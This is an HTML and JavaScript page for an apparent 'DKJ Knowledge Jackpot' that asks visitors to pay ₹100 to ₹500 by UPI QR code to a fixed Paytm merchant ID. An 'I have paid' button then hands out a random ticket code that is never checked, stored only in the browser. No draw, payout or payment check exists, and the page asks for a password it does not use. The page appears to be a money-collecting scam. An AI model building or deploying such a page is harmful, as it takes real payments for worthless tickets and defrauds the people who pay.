<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DKJ JACKPOT</title>
    <style>
        body { font-family: sans-serif; background: #f0f0f0; text-align: center; padding: 20px; }
        .btn { width: 100%; padding: 15px; margin: 10px 0; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; display: block; font-size: 16px; }
        .btn-gold { background: #c5a059; color: black; }
        .btn-dark { background: #0f2027; color: white; }
        #popup { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); color: white; padding-top: 50px; z-index: 9999; }
        input { width: 80%; padding: 12px; margin: 10px; border-radius: 5px; border: none; }
    </style>
</head>
<body>

    <h2 id="uName">DKJ KNOWLEDGE JACKPOT</h2>
    <div style="background:white; padding:20px; border-radius:15px; margin-bottom:20px;">
        <p>Wallet Balance</p>
        <h1 id="vBal">₹0</h1>
    </div>

    <div id="regDiv">
        <button class="btn btn-gold" onclick="showReg()">➕ CREATE ACCOUNT (FIRST STEP)</button>
    </div>

    <div id="mainButtons">
        <button class="btn btn-dark" onclick="join(100)">JOIN MEGA (₹100)</button>
        <button class="btn btn-dark" onclick="join(200)">JOIN SILVER (₹200)</button>
        <button class="btn btn-dark" onclick="join(500)">JOIN GOLD (₹500)</button>
        <button class="btn btn-gold" onclick="showProfile()">MY PROFILE</button>
    </div>

    <div id="popup">
        <div id="pContent"></div>
        <button onclick="closeP()" style="background:red; color:white; padding:10px 30px; border:none; border-radius:10px; margin-top:20px;">CLOSE</button>
    </div>

<script>
    let user = JSON.parse(localStorage.getItem('dkj_user')) || null;

    function showReg() {
        document.getElementById('pContent').innerHTML = `
            <h3>Enter Details</h3>
            <input id="n" placeholder="Full Name">
            <input id="m" placeholder="Mobile">
            <input id="p" placeholder="Password">
            <button class="btn btn-gold" onclick="saveUser()">REGISTER</button>
        `;
        document.getElementById('popup').style.display = 'block';
    }

    function saveUser() {
        let n = document.getElementById('n').value;
        let m = document.getElementById('m').value;
        if(!n || !m) return alert("Fill all!");
        user = {name: n, mob: m, bal: 0, codes: []};
        localStorage.setItem('dkj_user', JSON.stringify(user));
        alert("Account Created!");
        location.reload();
    }

    function join(amt) {
        if(!user) return alert("Pehle 'CREATE ACCOUNT' button par click karein!");
        document.getElementById('pContent').innerHTML = `
            <h3>Pay ₹${amt}</h3>
            <p>Scan QR & Send Money</p>
            <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=upi://pay?pa=paytmqr6vnhle@ptys%26am=${amt}">
            <button class="btn btn-gold" onclick="getTicket()">I HAVE PAID</button>
        `;
        document.getElementById('popup').style.display = 'block';
    }

    function getTicket() {
        let code = "DKJ-" + Math.floor(Math.random()*900000);
        user.codes.push(code);
        localStorage.setItem('dkj_user', JSON.stringify(user));
        alert("Your Ticket: " + code);
        closeP();
    }

    function showProfile() {
        if(!user) return alert("No Profile Found!");
        document.getElementById('pContent').innerHTML = `<h3>My Codes</h3><p>${user.codes.join(", ") || "No Tickets"}</p>`;
        document.getElementById('popup').style.display = 'block';
    }

    function closeP() { document.getElementById('popup').style.display = 'none'; }

    window.onload = function() {
        if(user) {
            document.getElementById('uName').innerText = "Hi, " + user.name;
            document.getElementById('vBal').innerText = "₹" + user.bal;
            document.getElementById('regDiv').style.display = "none";
        }
    };
</script>
</body>
</html>
